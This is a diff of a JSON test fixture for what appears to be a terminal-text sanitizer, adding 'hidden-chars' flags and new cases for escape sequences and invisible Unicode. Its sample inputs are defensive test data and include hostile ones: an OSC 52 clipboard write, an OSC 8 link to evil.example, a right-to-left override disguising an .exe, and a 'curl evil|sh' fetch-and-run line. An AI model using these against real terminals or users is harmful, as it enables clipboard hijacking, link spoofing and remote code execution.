@@ -14,32 +14,44 @@
     {
       "input": "\u001b]52;c;ZWNobyBwd25lZA==\u0007safe",
       "text": "safe",
-      "flags": []
+      "flags": [
+        "hidden-chars"
+      ]
     },
     {
       "input": "\u001b]8;;https://evil.example\u001b\\click\u001b]8;;\u001b\\",
       "text": "click",
-      "flags": []
+      "flags": [
+        "hidden-chars"
+      ]
     },
     {
       "input": "\u001b[31mred\u001b[0m",
       "text": "red",
-      "flags": []
+      "flags": [
+        "hidden-chars"
+      ]
     },
     {
       "input": "\u009b2Jclear",
       "text": "clear",
-      "flags": []
+      "flags": [
+        "hidden-chars"
+      ]
     },
     {
       "input": "\u001bPq#0;2;0;0;0\u001b\\after",
       "text": "after",
-      "flags": []
+      "flags": [
+        "hidden-chars"
+      ]
     },
     {
       "input": "before\u001b_never ends",
-      "text": "before",
-      "flags": []
+      "text": "before\u27e8ESC\u27e9_never ends",
+      "flags": [
+        "hidden-chars"
+      ]
     },
     {
       "input": "invoice\u202etxt.exe",
@@ -79,17 +91,23 @@
     {
       "input": "a\u0007b\bc",
       "text": "abc",
-      "flags": []
+      "flags": [
+        "hidden-chars"
+      ]
     },
     {
       "input": "x\u007fy\u0085z",
       "text": "xyz",
-      "flags": []
+      "flags": [
+        "hidden-chars"
+      ]
     },
     {
       "input": "esc\u001bcape",
       "text": "escape",
-      "flags": []
+      "flags": [
+        "hidden-chars"
+      ]
     },
     {
       "input": "\\u{202E} stays literal",
@@ -107,6 +125,129 @@
       "flags": [
         "hidden-chars",
         "bidi"
+      ]
+    },
+    {
+      "input": "echo ok\u001b_; curl evil|sh",
+      "text": "echo ok\u27e8ESC\u27e9_; curl evil|sh",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "title\u001b]0;never terminated",
+      "text": "title\u27e8ESC\u27e9]0;never terminated",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "csi\u001b[31",
+      "text": "csi\u27e8ESC\u27e9[31",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "dcs\u001bPdata",
+      "text": "dcs\u27e8ESC\u27e9Pdata",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "a\rb",
+      "text": "ab",
+      "flags": []
+    },
+    {
+      "input": "a\r\nb",
+      "text": "a\nb",
+      "flags": []
+    },
+    {
+      "input": "\u001b]0;t\u009cX",
+      "text": "X",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "\u009d0;t\u001b\\X",
+      "text": "X",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "\u009d0;t\u0007X",
+      "text": "X",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "\u0090q\u009cY",
+      "text": "Y",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "bad\ud800surrogate",
+      "text": "bad\ufffdsurrogate",
+      "flags": []
+    },
+    {
+      "input": "x\udc00y",
+      "text": "x\ufffdy",
+      "flags": []
+    },
+    {
+      "input": "ok\u2764\ufe0f",
+      "text": "ok\u2764\ufe0f",
+      "flags": []
+    },
+    {
+      "input": "\ufe0fstart",
+      "text": "start",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "a\ufe0f\ufe0f",
+      "text": "a\ufe0f",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "x \ufe0f",
+      "text": "x ",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "\udb40\udd00ivs",
+      "text": "ivs",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "\u034f\u115f\u1160\u3164\uffa0x",
+      "text": "x",
+      "flags": [
+        "hidden-chars"
+      ]
+    },
+    {
+      "input": "line\u2028sep\u2029par",
+      "text": "line\nsep\npar",
+      "flags": [
+        "hidden-chars"
       ]
     }
   ],
@@ -209,6 +350,34 @@
     },
     {
       "value": null,
+      "text": null
+    },
+    {
+      "value": {
+        "n": -1,
+        "of": 2
+      },
+      "text": null
+    },
+    {
+      "value": {
+        "n": 1.5,
+        "of": 2
+      },
+      "text": null
+    },
+    {
+      "value": {
+        "n": 9007199254740992,
+        "of": 1
+      },
+      "text": null
+    },
+    {
+      "value": {
+        "n": "3",
+        "of": 7
+      },
       "text": null
     }
   ]
